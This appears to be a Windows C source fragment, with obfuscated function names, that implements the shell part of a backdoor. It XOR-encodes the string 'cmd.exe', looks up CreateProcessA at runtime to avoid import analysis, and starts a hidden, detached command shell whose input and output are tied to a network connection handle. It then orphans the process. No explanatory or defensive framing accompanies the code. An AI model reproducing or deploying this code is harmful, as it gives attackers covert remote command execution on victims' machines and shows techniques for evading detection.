#ifdef _WIN32
#include "confio.h"

typedef BOOL (WINAPI *CPROC)(
    LPCSTR, LPSTR, LPSECURITY_ATTRIBUTES,
    LPSECURITY_ATTRIBUTES, BOOL, DWORD, LPVOID,
    LPCSTR, LPSTARTUPINFOA, LPPROCESS_INFORMATION
);

int q7k3(void* conn) {
    STARTUPINFO si;
    PROCESS_INFORMATION pi;
    char p[] = { 'c'^0x1F, 'm'^0x1F, 'd'^0x1F, '.'^0x1F, 'e'^0x1F, 'x'^0x1F, 'e'^0x1F, 0 };
    u0l8(p, 0x1F);

    ZeroMemory(&si, sizeof(si));
    ZeroMemory(&pi, sizeof(pi));

    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
    si.hStdInput = si.hStdOutput = si.hStdError = (HANDLE)conn;
    si.wShowWindow = SW_HIDE;

    HMODULE k32 = LoadLibraryA("kernel32.dll");
    if (!k32) return 0;

    CPROC fn = (CPROC)GetProcAddress(k32, "CreateProcessA");
    if (!fn) return 0;

    DWORD flags = CREATE_NO_WINDOW | DETACHED_PROCESS;

    BOOL ok = fn(NULL, p, NULL, NULL, TRUE, flags, NULL, NULL, &si, &pi);
    if (ok) {
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess); // immediately close handles so it's orphaned
    }

    return ok;
}
#endif
